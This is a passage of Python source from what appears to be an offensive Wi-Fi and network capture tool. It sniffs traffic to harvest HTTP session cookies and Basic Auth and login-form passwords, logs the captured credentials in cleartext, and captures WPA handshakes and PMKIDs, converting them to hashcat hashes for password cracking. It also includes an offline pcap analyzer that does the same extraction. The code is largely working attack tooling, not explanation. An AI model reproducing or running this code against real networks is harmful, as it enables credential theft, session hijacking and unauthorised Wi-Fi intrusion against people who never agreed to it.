    """Extract HTTP cookies and credentials from raw TCP payloads.
    
    Uses scapy's HTTPRequest/HTTPResponse layers if available,
    falls back to raw payload regex parsing for maximum compatibility.
    """
    
    def __init__(self):
        self.cookies: List[HTTPCookie] = []
        self.credentials: List[HTTPCredential] = []
        self._max_cookies = MAX_HTTP_COOKIES
        self._max_creds = MAX_HTTP_CREDENTIALS
        self._lock = threading.Lock()
        
        # Cookie jar for session tracking
        self._cookie_jar: Dict[str, Dict[str, str]] = defaultdict(dict)
    
    def extract(self, packet: 'Packet', packet_id: int = 0) -> Tuple[
                Optional[HTTPCookie], Optional[HTTPCredential]]:
        """Extract HTTP data from a packet.
        
        Args:
            packet: Scapy packet
            packet_id: Sequential packet ID
        
        Returns:
            Tuple of (cookie, credential) — either may be None
        """
        if not _HAS_SCAPY:
            return None, None
        
        cookie = None
        credential = None
        
        try:
            # Try scapy's HTTP layers first
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                
                # Get source/destination IPs
                src_ip = ''
                dst_ip = ''
                if packet.haslayer(IP):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                elif hasattr(packet, 'addr3'):
                    pass  # 802.11 frame
                
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # Check if this is HTTP traffic
                payload_str = payload.decode('utf-8', errors='replace')
                
                if payload_str.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ',
                                          'HEAD ', 'OPTIONS ', 'PATCH ')):
                    # HTTP Request
                    cookie = self._extract_request_cookies(
                        payload_str, src_ip, dst_ip, packet_id
                    )
                    credential = self._extract_request_credentials(
                        payload_str, packet_id, src_ip, dst_ip
                    )
                
                elif payload_str.startswith('HTTP/'):
                    # HTTP Response — check for Set-Cookie
                    cookie = self._extract_response_cookies(
                        payload_str, src_ip, dst_ip, packet_id
                    )
        
        except Exception:
            pass
        
        with self._lock:
            if cookie and len(self.cookies) < self._max_cookies:
                self.cookies.append(cookie)
            if credential and len(self.credentials) < self._max_creds:
                self.credentials.append(credential)
        
        return cookie, credential
    
    def _extract_request_cookies(self, payload: str, src_ip: str,
                                  dst_ip: str, packet_id: int) -> Optional[HTTPCookie]:
        """Extract cookies from HTTP request headers."""
        # Parse request line
        lines = payload.split('\r\n')
        if not lines:
            return None
        
        request_line = lines[0]
        parts = request_line.split()
        if len(parts) < 2:
            return None
        
        method = parts[0]
        path = parts[1]
        
        # Extract Host header for domain
        domain = ''
        for line in lines[1:]:
            if line.lower().startswith('host:'):
                domain = line.split(':', 1)[1].strip()
                break
            if line.lower().startswith('cookie:'):
                cookie_str = line.split(':', 1)[1].strip()
                # Parse cookies
                for cookie_pair in cookie_str.split(';'):
                    cookie_pair = cookie_pair.strip()
                    if '=' in cookie_pair:
                        name, value = cookie_pair.split('=', 1)
                        result = HTTPCookie(
                            domain=domain or dst_ip,
                            path=path,
                            name=name.strip(),
                            value=value.strip(),
                            source_ip=src_ip,
                            destination_ip=dst_ip,
                            timestamp=time.time(),
                            raw_packet_id=packet_id,
                        )
                        # Track in jar
                        self._cookie_jar[domain][name.strip()] = value.strip()
                        return result
        
        return None
    
    def _extract_response_cookies(self, payload: str, src_ip: str,
                                   dst_ip: str, packet_id: int) -> Optional[HTTPCookie]:
        """Extract Set-Cookie from HTTP response headers."""
        lines = payload.split('\r\n')
        
        domain = ''
        for line in lines[1:]:
            if line.lower().startswith('set-cookie:'):
                cookie_str = line.split(':', 1)[1].strip()
                # Parse attributes
                attrs = cookie_str.split(';')
                if '=' in attrs[0]:
                    name, value = attrs[0].split('=', 1)
                    
                    result = HTTPCookie(
                        domain=domain or src_ip,
                        name=name.strip(),
                        value=value.strip(),
                        source_ip=src_ip,
                        destination_ip=dst_ip,
                        timestamp=time.time(),
                        raw_packet_id=packet_id,
                    )
                    
                    # Parse cookie attributes
                    for attr in attrs[1:]:
                        attr = attr.strip().lower()
                        if attr == 'secure':
                            result.secure = True
                        elif attr == 'httponly':
                            result.httponly = True
                        elif attr.startswith('expires='):
                            result.expires = attr.split('=', 1)[1]
                        elif attr.startswith('path='):
                            result.path = attr.split('=', 1)[1]
                        elif attr.startswith('domain='):
                            result.domain = attr.split('=', 1)[1]
                    
                    return result
            
            elif line.lower().startswith('content-type:'):
                # Check for text/html with form content (credentials)
                pass
        
        return None
    
    def _extract_request_credentials(self, payload: str, packet_id: int,
                                      src_ip: str, dst_ip: str) -> Optional[HTTPCredential]:
        """Extract HTTP Basic Auth and form credentials."""
        lines = payload.split('\r\n')
        if not lines:
            return None
        
        request_line = lines[0]
        parts = request_line.split()
        if len(parts) < 2:
            return None
        
        method = parts[0]
        url = parts[1]
        
        # Check for Basic Authentication header
        for line in lines[1:]:
            if line.lower().startswith('authorization: basic '):
                try:
                    encoded = line.split(' ', 2)[2]
                    decoded = base64.b64decode(encoded).decode('utf-8', errors='replace')
                    if ':' in decoded:
                        username, password = decoded.split(':', 1)
                        return HTTPCredential(
                            url=url,
                            method='BASIC_AUTH',
                            username=username,
                            password=password,
                            source_ip=src_ip,
                            destination_ip=dst_ip,
                            timestamp=time.time(),
                            raw_packet_id=packet_id,
                        )
                except Exception:
                    pass
        
        # Check POST body for form credentials
        if method == 'POST':
            body_start = payload.find('\r\n\r\n')
            if body_start > 0:
                body = payload[body_start + 4:]
                
                # Look for common credential field names
                field_names = ['username', 'user', 'login', 'email',
                              'password', 'pass', 'passwd', 'pwd']
                
                extracted = {}
                for param in body.split('&'):
                    if '=' in param:
                        k, v = param.split('=', 1)
                        k = k.strip().lower()
                        if k in field_names:
                            # URL decode
                            v = self._url_decode(v)
                            extracted[k] = v
                
                if 'username' in extracted and 'password' in extracted:
                    return HTTPCredential(
                        url=url,
                        method='POST_FORM',
                        username=extracted['username'],
                        password=extracted['password'],
                        source_ip=src_ip,
                        destination_ip=dst_ip,
                        timestamp=time.time(),
                        raw_packet_id=packet_id,
                    )
        return None
    
    @staticmethod
    def _url_decode(s: str) -> str:
        """Simple URL decoding."""
        result = []
        i = 0
        while i < len(s):
            if s[i] == '%' and i + 2 < len(s):
                try:
                    result.append(chr(int(s[i+1:i+3], 16)))
                    i += 3
                except ValueError:
                    result.append(s[i])
                    i += 1
            elif s[i] == '+':
                result.append(' ')
                i += 1
            else:
                result.append(s[i])
                i += 1
        return ''.join(result)
    
    def get_all_cookies(self) -> List[HTTPCookie]:
        with self._lock:
            return self.cookies.copy()
    
    def get_all_credentials(self) -> List[HTTPCredential]:
        with self._lock:
            return self.credentials.copy()
    
    def export_json(self) -> Dict[str, Any]:
        return {
            'cookies': [asdict(c) for c in self.get_all_cookies()],
            'credentials': [asdict(c) for c in self.get_all_credentials()],
            'total_cookies': len(self.cookies),
            'total_credentials': len(self.credentials),
        }


# ====================================================================
# MANUAL HC22000 GENERATOR — No external tools needed
# ====================================================================

class HC22000Generator:
    """Generate hashcat mode 22000 hashes directly from captured handshakes.
    
    This avoids the need for hcxpcapngtool by manually constructing
    the hash line from parsed EAPOL frames.
    
    Format: 
    WPA*01*ANONCE_B64*SNONCE_B64*AP_MAC*STA_MAC*???*SSID_B64*MIC*EAPOL_FRAME##
    
    Reference: https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
    """
    
    @staticmethod
    def generate(handshake: HandshakeInfo) -> Optional[str]:
        """Generate a mode 22000 hash line from handshake info.
        
        Args:
            handshake: Complete HandshakeInfo
        
        Returns:
            Hash line string ready for hashcat, or None
        """
        if not handshake.is_complete:
            return None
        
        bssid = handshake.bssid.replace(':', '').lower()
        if not bssid or len(bssid) != 12:
            return None
        
        client = handshake.client_mac.replace(':', '').lower()
        if not client or len(client) != 12:
            return None
        
        if not handshake.ssid:
            return None
        
        # SSID as base64
        ssid_b64 = base64.b64encode(handshake.ssid.encode('utf-8')).decode()
        
        # Nonces as base64
        anonce_b64 = base64.b64encode(handshake.anonce).decode() if handshake.anonce else ''
        snonce_b64 = base64.b64encode(handshake.snonce).decode() if handshake.snonce else ''
        
        # MIC as hex
        mic_hex = handshake.mic.hex() if handshake.mic else '00' * 16
        
        # EAPOL frame (Message 2 or 3) as base64
        # Hashcat expects the EAPOL frame starting from EAPOL header
        eapol_data = handshake.eapol_3 if handshake.eapol_3 else handshake.eapol_2
        if not eapol_data:
            return None
        
        eapol_b64 = base64.b64encode(eapol_data).decode()
        
        return f"WPA*01*{anonce_b64}*{snonce_b64}*{bssid}*{client}*???*{ssid_b64}*{mic_hex}*{eapol_b64}##"
    
    @staticmethod
    def generate_pmkid(pmkid_info: PMKIDInfo) -> Optional[str]:
        """Generate a mode 16800 (PMKID) hash line."""
        if not pmkid_info or not pmkid_info.pmkid:
            return None
        
        pmkid_hex = pmkid_info.pmkid.hex()
        ap_mac = pmkid_info.bssid.replace(':', '').lower()
        sta_mac = pmkid_info.client_mac.replace(':', '').lower()
        ssid_b64 = base64.b64encode(pmkid_info.ssid.encode('utf-8')).decode() if pmkid_info.ssid else ''
        
        return f"WPA*01*{pmkid_hex}*{ap_mac}*{sta_mac}*{ssid_b64}"
    
    @staticmethod
    def convert_pcap(input_path: str, output_path: str) -> int:
        """Convert a pcap file to hashcat 22000 format.
        
        Args:
            input_path: Path to .pcap file
            output_path: Path to output .hc22000 file
        
        Returns:
            Number of hashes written
        """
        if not _HAS_SCAPY:
            return 0
        
        count = 0
        handshakes: Dict[Tuple[str, str], HandshakeStateMachine] = {}
        
        packets = rdpcap(input_path)
        
        for packet in packets:
            if not packet.haslayer(EAPOL):
                continue
            
            # Get MACs from the 802.11 or Ethernet layer
            if packet.haslayer(Dot11):
                bssid = packet[Dot11].addr3 or packet[Dot11].addr2 or ''
                client = packet[Dot11].addr2 or packet[Dot11].addr1 or ''
            elif packet.haslayer(Ether):
                # Ethernet frame (from tcpdump capture)
                src = packet[Ether].src
                dst = packet[Ether].dst
                bssid = src  # In bridged captures, AP is usually src
                client = dst
            else:
                continue
            
            # Get EAPOL data
            if packet.haslayer(EAPOL):
                try:
                    raw_eapol = bytes(packet[EAPOL])
                except (AttributeError, TypeError):
                    continue
                
                parsed = EAPOLFrameParser.parse_eapol_key(raw_eapol)
                if not parsed:
                    continue
                
                key = (bssid, client)
                if key not in handshakes:
                    handshakes[key] = HandshakeStateMachine(bssid)
                
                sm = handshakes[key]
                if sm.process_eapol(client, parsed, raw_eapol, time.time()):
                    # Complete handshake
                    hs = sm.get_handshake()
                    hash_line = HC22000Generator.generate(hs)
                    if hash_line:
                        with open(output_path, 'a') as f:
                            f.write(hash_line + '\n')
                        count += 1
        
        return count


# ====================================================================
# PACKET CAPTURE ENGINE — Main Class
# ====================================================================

class PacketCaptureEngine:
    """High-performance packet capture engine with handshake detection.
    
    This is the core capture class. It manages:
    - Live packet capture via scapy's sniff() with BPF filters
    - EAPOL/4-way handshake detection and extraction
    - PMKID capture from RSN IEs
    - HTTP cookie/credential extraction
    - File output in pcap, hc22000, and JSON formats
    - Thread-safe start/stop with queue-based progress
    
    Architecture:
        Sniff Thread (scapy) 
            → Packet Handler (per-packet callback)
                → EAPOL State Machine(s) per (BSSID, Client)
                → PMKID Detector
                → HTTP Extractor
                → Ring Buffer (recent N packets)
                → File Writer (batch flush to .pcap)
        
    Usage:
        engine = PacketCaptureEngine(console)
        engine.start_capture(interface='wlan0', timeout=60)
        # ... later ...
        result = engine.stop_capture()
        print(f"Handshake: {result.handshake_captured}")
    """
    
    def __init__(self, console=None):
        self.console = console
        
        # State
        self._stop_event = threading.Event()
        self._paused_event = threading.Event()
        self._paused_event.set()  # Not paused
        self._capture_thread: Optional[threading.Thread] = None
        self._packet_lock = threading.Lock()
        
        # Data stores
        self._handshake_machines: Dict[Tuple[str, str], HandshakeStateMachine] = {}
        self._pmkid_detector = PMKIDDetector()
        self._http_extractor = HTTPExtractor()
        
        # Ring buffer for packet log
        self._packet_log: deque = deque(maxlen=DEFAULT_RING_BUFFER_SIZE)
        self._packet_counter = 0
        self._packets_written = 0
        self._bytes_counter = 0
        self._start_time = 0.0
        self._last_packet_time = 0.0
        
        # Frame counters
        self._frame_counts = {
            'beacon': 0, 'probe_req': 0, 'probe_resp': 0,
            'auth': 0, 'assoc_req': 0, 'assoc_resp': 0,
            'deauth': 0, 'disasso': 0, 'eapol': 0, 'data': 0,
        }
        self._channel_stats: Dict[int, int] = defaultdict(int)
        self._unique_stations: Set[str] = set()
        
        # File handles
        self._pcap_file: Optional[str] = None
        self._hash_file: Optional[str] = None
        self._http_file: Optional[str] = None
        self._packet_buffer: List['Packet'] = []
        self._buffer_lock = threading.Lock()
        
        # Progress callbacks (set by UI thread)
        self._progress_cb: Optional[Callable] = None
        self._log_cb: Optional[Callable] = None
        
        # Capture result
        self._result = CaptureResult()
        
        # Ensure directories exist
        ensure_directories()
    
    def _log(self, msg: str, level: str = "info"):
        if self.console:
            self.console.log(msg, level)
    
    # ====================================================================
    # MAIN CAPTURE API
    # ====================================================================
    
    def start_capture(self, interface: str, bssid: str = '', ssid: str = '',
                      timeout: int = 0, filter_type: str = 'all',
                      output_file: str = '', channel: int = 0,
                      progress_cb: Callable = None,
                      log_cb: Callable = None) -> 'CaptureResult':
        """Start packet capture in background thread.
        
        Args:
            interface: Network interface for capture
            bssid: Target BSSID (optional)
            ssid: Target SSID (optional)
            timeout: Capture duration in seconds (0 = manual stop)
            filter_type: BPF filter preset ('all', 'handshake', 'pmkid', 'http', 'wpa')
            output_file: Output pcap path (auto-generated if empty)
            channel: Fixed channel to listen on (0 = current channel)
            progress_cb: Callback for progress updates
            log_cb: Callback for packet log entries
        
        Returns:
            CaptureResult (updated in real-time via progress_cb)
        """
        if not _HAS_SCAPY:
            raise CaptureError(
                "Scapy is not available. Install with: pip install scapy"
            )
        
        if self._capture_thread and self._capture_thread.is_alive():
            raise CaptureError("Capture already running. Stop first.")
        
        # Reset state
        self._stop_event.clear()
        self._packet_counter = 0
        self._packets_written = 0
        self._bytes_counter = 0
        self._handshake_machines.clear()
        self._http_extractor = HTTPExtractor()
        self._frame_counts = {k: 0 for k in self._frame_counts}
        self._channel_stats.clear()
        self._unique_stations.clear()
        self._packet_log.clear()
        self._packet_buffer = []
        self._start_time = time.time()
        
        # Store config
        self._progress_cb = progress_cb
        self._log_cb = log_cb
        
        # Generate output file if not specified
        if not output_file:
            safe_ssid = safe_filename(ssid or bssid or f"capture_{int(time.time())}")
            timestamp = current_timestamp('file')
            output_file = str(CAPTURE_DIR / f"{safe_ssid}_{timestamp}.pcap")
        
        self._pcap_file = output_file
        
        # Prepare hash output
        hash_dir = Path(output_file).parent
        hash_base = Path(output_file).stem
        self._hash_file = str(hash_dir / f"{hash_base}.hc22000")
        self._http_file = str(hash_dir / f"{hash_base}_http.json")
        
        # Build BPF filter
        bpf_filter = BPF_FILTERS.get(filter_type, '')
        
        # Build target-specific filter
        if bssid and validate_mac(bssid):
            # Create a filter targeting specific BSSID
            bssid_filter = f"ether host {bssid}"
            if bpf_filter:
                bpf_filter = f"({bpf_filter}) and ({bssid_filter})"
            else:
                bpf_filter = bssid_filter
        
        # Start capture thread
        self._capture_thread = threading.Thread(
            target=self._capture_loop,
            kwargs={
                'interface': interface,
                'bpf_filter': bpf_filter,
                'timeout': timeout,
                'channel': channel,
            },
            daemon=True,
            name='medusa-capture',
        )
        self._capture_thread.start()
        
        self._log(f"Capture started on {interface} (filter: {filter_type}, "
                  f"timeout: {timeout if timeout else 'manual'})", "ok")
        
        return self._result
    
    def _capture_loop(self, interface: str, bpf_filter: str = '',
                       timeout: int = 0, channel: int = 0):
        """Main capture loop — runs in background thread."""
        try:
            # Set monitor channel if specified
            if channel > 0 and IS_LINUX:
                self._set_channel(interface, channel)
            
            # Start sniffing
            sniff(
                iface=interface,
                prn=self._process_packet,
                store=False,
                timeout=timeout if timeout else None,
                stop_filter=lambda _: self._stop_event.is_set(),
                filter=bpf_filter if bpf_filter else None,
            )
        
        except PermissionError:
            self._log("Permission denied. Run as root/Administrator.", "error")
        except OSError as e:
            self._log(f"Interface error: {e}", "error")
        except Exception as e:
            self._log(f"Capture error: {e}", "error")
        finally:
            self._finalize_capture()
    
    # ====================================================================
    # PACKET PROCESSING
    # ====================================================================
    
    def _process_packet(self, packet: 'Packet'):
        """Per-packet callback — process and classify."""
        if self._stop_event.is_set():
            return
        
        self._last_packet_time = time.time()
        self._packet_counter += 1
        packet_id = self._packet_counter
        
        # Quick size tracking
        try:
            self._bytes_counter += len(packet)
        except Exception:
            pass
        
        # Log to ring buffer
        self._packet_log.append((packet_id, time.time(), packet.summary()[:120]))
        
        # Count by type
        frame_info = self._classify_frame(packet)
        if frame_info:
            ftype = frame_info.get('subtype', 'unknown')
            if ftype in self._frame_counts:
                self._frame_counts[ftype] += 1
            if frame_info.get('channel'):
                self._channel_stats[frame_info['channel']] += 1
            if frame_info.get('station'):
                self._unique_stations.add(frame_info['station'])
        
        # Buffer for pcap write
        with self._buffer_lock:
            self._packet_buffer.append(packet)
            if len(self._packet_buffer) >= PCAP_FLUSH_INTERVAL:
                buf = self._packet_buffer.copy()
                self._packet_buffer.clear()
                threading.Thread(target=self._flush_buffer,
                                 args=(buf,), daemon=True).start()
        
        # Check for EAPOL (handshake detection)
        if packet.haslayer(EAPOL):
            self._frame_counts['eapol'] += 1
            self._process_eapol_packet(packet, packet_id)
        
        # Check for PMKID in management frames
        if packet.haslayer(Dot11) and not packet.haslayer(EAPOL):
            self._process_pmkid_packet(packet)
        
        # HTTP extraction
        self._process_http_packet(packet, packet_id)
        
        # Progress callback
        self._update_result()
        if self._progress_cb:
            self._progress_cb(self._result)
    
    def _classify_frame(self, packet: 'Packet') -> Dict[str, Any]:
        """Classify a packet returning frame metadata."""
        result: Dict[str, Any] = {}
        
        try:
            if packet.haslayer(Dot11Beacon):
                result['subtype'] = 'beacon'
                bs = packet[Dot11]
                result['bssid'] = bs.addr2
                result['station'] = bs.addr2
                try:
                    p = packet
                    while p:
                        if isinstance(p, Dot11Elt) and p.ID == 0:
                            result['ssid'] = p.info.decode('utf-8', errors='replace')
                            break
                        p = p.payload
                except Exception:
                    pass
                
                # Channel
                try:
                    p = packet
                    while p:
                        if isinstance(p, Dot11Elt) and p.ID == 3:
                            result['channel'] = p.info[0]
                            break
                        p = p.payload
                except Exception:
                    pass
                
                # Signal
                if packet.haslayer(RadioTap):
                    try:
                        rt = packet[RadioTap]
                        if hasattr(rt, 'dBm_AntSignal'):
                            result['signal'] = rt.dBm_AntSignal
                        elif hasattr(rt, 'AntennaSignal'):
                            result['signal'] = -100 + rt.AntennaSignal
                    except Exception:
                        pass
            
            elif packet.haslayer(Dot11ProbeReq):
                result['subtype'] = 'probe_req'
                bs = packet[Dot11]
                result['station'] = bs.addr2
            
            elif packet.haslayer(Dot11ProbeResp):
                result['subtype'] = 'probe_resp'
                bs = packet[Dot11]
                result['bssid'] = bs.addr2
                result['station'] = bs.addr2
            
            elif packet.haslayer(Dot11Auth):
                result['subtype'] = 'auth'
                bs = packet[Dot11]
                result['station'] = bs.addr2
            
            elif packet.haslayer(Dot11AssoReq):
                result['subtype'] = 'assoc_req'
                bs = packet[Dot11]
                result['station'] = bs.addr2
            
            elif packet.haslayer(Dot11AssoResp):
                result['subtype'] = 'assoc_resp'
                bs = packet[Dot11]
                result['station'] = bs.addr2
            
            elif packet.haslayer(Dot11):
                fc_type = packet[Dot11].type
                fc_subtype = packet[Dot11].subtype
                
                if fc_type == 0:  # Management
                    subtype_names = {
                        10: 'disasso', 12: 'deauth'
                    }
                    result['subtype'] = subtype_names.get(fc_subtype, f'mgt_{fc_subtype}')
                    result['station'] = packet[Dot11].addr2 or ''
                elif fc_type == 2:  # Data
                    result['subtype'] = 'data'
                    result['station'] = packet[Dot11].addr2 or ''
        
        except Exception:
            pass
        
        return result
    
    # ====================================================================
    # EAPOL / HANDSHAKE PROCESSING
    # ====================================================================
    
    def _process_eapol_packet(self, packet: 'Packet', packet_id: int):
        """Process an EAPOL packet for 4-way handshake detection."""
        try:
            # Get MACs
            if packet.haslayer(Dot11):
                dot11 = packet[Dot11]
                bssid = dot11.addr3 or dot11.addr2 or dot11.addr1 or ''
                client = dot11.addr2 or dot11.addr1 or ''
            elif packet.haslayer(Ether):
                eth = packet[Ether]
                bssid = eth.src
                client = eth.dst
            else:
                return
            
            bssid = bssid.upper()
            client = client.upper()
            
            if not bssid or not client:
                return
            
            # Extract EAPOL key data
            raw_eapol = bytes(packet[EAPOL])
            parsed = EAPOLFrameParser.parse_eapol_key(raw_eapol)
            if not parsed:
                return
            
            # Get or create state machine for this AP/Client pair
            key = (bssid, client)
            if key not in self._handshake_machines:
                self._handshake_machines[key] = HandshakeStateMachine(bssid)
            
            sm = self._handshake_machines[key]
            is_complete = sm.process_eapol(client, parsed, raw_eapol, time.time())
            
            if is_complete:
                hs = sm.get_handshake()
                self._result.handshake_captured = True
                self._result.handshake_count += 1
                self._result.handshakes.append(hs)
                self._result.latest_handshake_time = time.time()
                
                # Generate hash
                hash_line = HC22000Generator.generate(hs)
                if hash_line:
                    # Append to hash file
                    try:
                        with open(self._hash_file, 'a') as hf:
                            hf.write(hash_line + '\n')
                        self._result.hash_count += 1
                    except IOError as e:
                        self._log(f"Hash write error: {e}", "warning")
                
                self._log(f"4-way handshake captured: {hs.bssid[:8]}... → {hs.client_mac[:8]}... "
                          f"(SSID: {hs.ssid or 'hidden'})", "success")
                
                # Log packet IDs for handshake
                for msg_num, ts in sm.get_message_timestamps():
                    self._packet_log.append((packet_id, ts, f"HANDSHAKE M{msg_num}"))
        
        except Exception as e:
            self._log(f"EAPOL processing error: {e}", "debug")
    
    def _process_pmkid_packet(self, packet: 'Packet'):
        """Extract PMKID from RSN IE in management frames."""
        try:
            pmkid_info = self._pmkid_detector.extract(packet)
            if pmkid_info:
                self._result.pmkid_captured = True
                self._result.pmkid_count += 1
                self._result.pmkids.append(pmkid_info)
                
                # Write to hash file
                if self._hash_file:
                    hash_line = HC22000Generator.generate_pmkid(pmkid_info)
                    if hash_line:
                        try:
                            with open(self._hash_file, 'a') as hf:
                                hf.write(hash_line + '\n')
                            self._result.hash_count += 1
                        except IOError:
                            pass
                
                self._log(f"PMKID captured from {pmkid_info.bssid[:12]} → {pmkid_info.client_mac[:12]} "
                          f"(SSID: {pmkid_info.ssid or 'hidden'})", "success")
        
        except Exception:
            pass
    
    def _process_http_packet(self, packet: 'Packet', packet_id: int):
        """Extract HTTP data from packet."""
        try:
            cookie, cred = self._http_extractor.extract(packet, packet_id)
            if cookie:
                self._result.http_cookies.append(cookie)
                self._result.http_cookie_count += 1
                self._log(f"HTTP Cookie: {cookie.name}={cookie.value[:20]} "
                          f"({cookie.domain})", "info")
            if cred:
                self._result.http_credentials.append(cred)
                self._result.http_cred_count += 1
                self._log(f"HTTP Credential: {cred.username}:{cred.password} "
                          f"({cred.url})", "success")
        except Exception:
            pass
    
    # ====================================================================
    # FILE OPERATIONS
    # ====================================================================
    
    def _flush_buffer(self, packets: List['Packet']):
        """Write buffered packets to pcap file."""
        try:
            with self._packet_lock:
                wrpcap(self._pcap_file, packets, append=True)
                self._packets_written += len(packets)
        except Exception as e:
            self._log(f"Pcap write error: {e}", "warning")
    
    def _update_result(self):
        """Update the result object with current stats."""
        elapsed = time.time() - self._start_time
        rate = self._packet_counter / elapsed if elapsed > 0 else 0
        
        self._result.packets_total = self._packet_counter
        self._result.bytes_total = self._bytes_counter
        self._result.duration = elapsed
        self._result.packet_rate = rate
        self._result.active = not self._stop_event.is_set()
    
    def _set_channel(self, interface: str, channel: int):
        """Set interface to a specific channel (Linux only)."""
        try:
            subprocess.run(
                ['iw', 'dev', interface, 'set', 'channel', str(channel)],
                capture_output=True, timeout=2
            )
        except Exception:
            pass
    
    # ====================================================================
    # CONTROL
    # ====================================================================
    
    def stop_capture(self) -> 'CaptureResult':
        """Stop the capture and finalize output."""
        if not self._capture_thread or not self._capture_thread.is_alive():
            self._log("No active capture to stop.", "warning")
            return self._result
        
        self._log("Stopping capture...", "info")
        self._stop_event.set()
        self._capture_thread.join(timeout=10)
        
        if self._capture_thread.is_alive():
            self._log("Capture thread did not stop cleanly.", "warning")
        
        self._finalize_capture()
        return self._result
    
    def _finalize_capture(self):
        """Flush remaining data and write final output."""
        # Flush remaining packet buffer
        with self._buffer_lock:
            if self._packet_buffer:
                self._flush_buffer(self._packet_buffer)
                self._packet_buffer.clear()
        
        # Write HTTP data
        if self._http_file and (self._http_extractor.get_all_cookies() or
                                 self._http_extractor.get_all_credentials()):
            try:
                with open(self._http_file, 'w') as f:
                    json.dump(self._http_extractor.export_json(), f, indent=2)
                self._log(f"HTTP data saved: {self._http_file}", "ok")
            except IOError as e:
                self._log(f"HTTP export error: {e}", "warning")
        
        self._update_result()
        
        self._log(f"Capture complete: {self._packet_counter} packets, "
                  f"{self._result.handshake_count} handshakes, "
                  f"{self._result.pmkid_count} PMKIDs", "ok")
    
    def pause_capture(self):
        self._paused_event.clear()
        self._log("Capture paused", "info")
    
    def resume_capture(self):
        self._paused_event.set()
        self._log("Capture resumed", "info")
    
    # ====================================================================
    # DISPLAY & INFO
    # ====================================================================
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current capture statistics."""
        return {
            'active': self._result.active,
            'packets': self._packet_counter,
            'bytes': self._bytes_counter,
            'duration': time.time() - self._start_time if self._start_time else 0,
            'handshakes': self._result.handshake_count,
            'pmkids': self._result.pmkid_count,
            'http_cookies': self._result.http_cookie_count,
            'http_creds': self._result.http_cred_count,
            'unique_stations': len(self._unique_stations),
            'packet_rate': self._result.packet_rate,
            'frame_counts': dict(self._frame_counts),
        }
    
    def get_packet_log(self, count: int = 10) -> List[Tuple]:
        """Get recent packet log entries."""
        return list(self._packet_log)[-count:]
    
    def get_channel_stats(self) -> Dict[int, int]:
        return dict(self._channel_stats)
    
    def get_unique_stations(self) -> Set[str]:
        return self._unique_stations.copy()
    
    def get_output_paths(self) -> Dict[str, str]:
        return {
            'pcap': self._pcap_file or '',
            'hash': self._hash_file or '',
            'http': self._http_file or '',
        }


# ====================================================================
# OFFLINE PCAP ANALYZER
# ====================================================================

class PCAPAnalyzer:
    """Analyze saved pcap files for handshakes, PMKIDs, and HTTP data.
    
    Can work without live capture — scans through existing .pcap files.
    Useful for post-capture analysis or when capturing with external
    tools like tcpdump, airodump-ng, or Wireshark.
    """
    
    def __init__(self, console=None):
        self.console = console
        self._log = lambda msg, level='info': (
            console.log(msg, level) if console else None
        )
    
    def analyze(self, pcap_path: str, output_dir: str = '',
                 extract_handshakes: bool = True,
                 extract_pmkid: bool = True,
                 extract_http: bool = True) -> 'CaptureResult':
        """Analyze a pcap file for targets of interest.
        
        Args:
            pcap_path: Path to .pcap or .pcapng file
            output_dir: Output directory for extracted hashes
            extract_handshakes: Extract EAPOL 4-way handshakes
            extract_pmkid: Extract PMKID from RSN IEs
            extract_http: Extract HTTP cookies/credentials
        
        Returns:
            CaptureResult with findings
        """
        if not _HAS_SCAPY:
            raise CaptureError("Scapy not available. Install: pip install scapy")
        
        pcap_path = Path(pcap_path)
        if not pcap_path.exists():
            raise FileNotFoundError(f"PCAP not found: {pcap_path}")
        
        self._log(f"Analyzing: {pcap_path.name} ({human_bytes(pcap_path.stat().st_size)})", "info")
        
        result = CaptureResult()
        handshake_machines: Dict[Tuple[str, str], HandshakeStateMachine] = {}
        pmkid_detector = PMKIDDetector()
        http_extractor = HTTPExtractor()
        
        output_dir = Path(output_dir) if output_dir else pcap_path.parent
        output_dir.mkdir(parents=True, exist_ok=True)
        
        hash_path = output_dir / f"{pcap_path.stem}.hc22000"
        
        packets = rdpcap(str(pcap_path))
        total = len(packets)
        
        self._log(f"Processing {total} packets...", "info")
        
        for i, packet in enumerate(packets):
            # Progress every 10k
            if i % 10000 == 0 and i > 0:
                pct = (i / total) * 100
                self._log(f"  Progress: {i}/{total} ({pct:.1f}%)", "debug")
            
            # EAPOL
            if packet.haslayer(EAPOL) and extract_handshakes:
                try:
                    if packet.haslayer(Dot11):
                        dot11 = packet[Dot11]
                        bssid = dot11.addr3 or dot11.addr2 or ''
                        client = dot11.addr2 or dot11.addr1 or ''
                    elif packet.haslayer(Ether):
                        eth = packet[Ether]
                        bssid = eth.src
                        client = eth.dst
                    else:
                        continue
                    
                    bssid = bssid.upper()
                    client = client.upper()
                    if not bssid or not client:
                        continue
                    
                    raw = bytes(packet[EAPOL])
                    parsed = EAPOLFrameParser.parse_eapol_key(raw)
                    if not parsed:
                        continue
                    
                    key = (bssid, client)
                    if key not in handshake_machines:
                        handshake_machines[key] = HandshakeStateMachine(bssid)
                    
                    sm = handshake_machines[key]
                    if sm.process_eapol(client, parsed, raw, time.time()):
                        hs = sm.get_handshake()
                        result.handshake_captured = True
                        result.handshake_count += 1
                        result.handshakes.append(hs)
                        
                        hl = HC22000Generator.generate(hs)
                        if hl:
                            with open(str(hash_path), 'a') as f:
                                f.write(hl + '\n')
                            result.hash_count += 1
                        
                        self._log(f"Handshake #{result.handshake_count}: "
                                  f"{hs.bssid[:12]} → {hs.client_mac[:12]} ({hs.ssid or 'hidden'})",
                                  "success")
                except Exception:
                    continue
            
            # PMKID
            if packet.haslayer(Dot11) and extract_pmkid:
                self._analyze_pmkid(packet, pmkid_detector, result, hash_path)
            
            # HTTP
            if extract_http:
                cookie, cred = http_extractor.extract(packet, i)
                if cookie:
                    result.http_cookies.append(cookie)
                    result.http_cookie_count += 1
                if cred:
                    result.http_credentials.append(cred)
                    result.http_cred_count += 1
        
        # Write HTTP data if any
        if result.http_cookies or result.http_credentials:
            http_path = output_dir / f"{pcap_path.stem}_http.json"
            with open(str(http_path), 'w') as f:
                json.dump(http_extractor.export_json(), f, indent=2)
            self._log(f"HTTP data: {http_path}", "ok")
        
        # Summary
        self._log(f"Analysis complete: {total} packets, "
